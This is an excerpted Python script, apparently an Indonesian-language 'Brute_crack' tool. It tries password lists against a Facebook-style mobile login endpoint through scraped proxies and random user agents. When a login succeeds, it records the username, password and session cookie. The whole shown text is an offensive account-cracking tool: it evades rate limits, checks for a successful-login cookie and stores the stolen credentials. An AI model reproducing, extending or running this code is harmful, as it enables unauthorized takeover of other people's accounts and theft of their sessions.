...
import requests, re, random, datetime, bs4, json, time
...
class Brute_crack:
    def __init__(self, oz):
        ...
        self.url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        self.id = oz
        self.proox()
        self.plerr()
    # ------- METODE --------
...
[{biru_m}3{hapus}] method mobile (super slow) [[green] Disarankan [/]]""",title="[green]METODE LOGIN[/]"))
    ...
    def proox(self):
        try:
            ...
            open('.prox.txt','w').write(x)
        except Exception as e:
            exit(x)
    # ------- UA RANDOM ----------------
    def get_license(self, integer):
        lis = list("1234567890")
...
[{merah}×{hapus}] hidupkan mode pesawat 2 detik jika tidak ada hasil."""))
    ...
    def ua_set(self):
        try:
            ...
            try:
                self.uas = open("data/ua_ran.txt", "r").read().splitlines()
            except FileNotFoundError:
                for x in range(1000):
                    ...
                    g='AppleWebKit/537.36 (KHTML, like Gecko)  UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/537.36'
    ...
    def __metode__(self, user, pasw, cebok):
        ...
        for pw in pasw:
            try:
                ...
                iii = open('.prox.txt','r').read().splitlines()
                xxx = random.choice(iii)
                zzz = {"http": "socks4://"+xxx}
                uas = random.choice(self.ua_set())
                digit = random.choice([2])
                digit = self.get_license(digit)
                ...
                po = session.post(f'https://{cebok}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=zzz)
                if "c_user" in session.cookies.get_dict():
                    ...
                    if "y" in self.apk:
                        ...
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}").add(f"[bold green]{coki}ua={digit}")
                        prints(tree)
                    wrt = f"{user}|{pw}|{coki}"
                    self.ok.append(wrt)
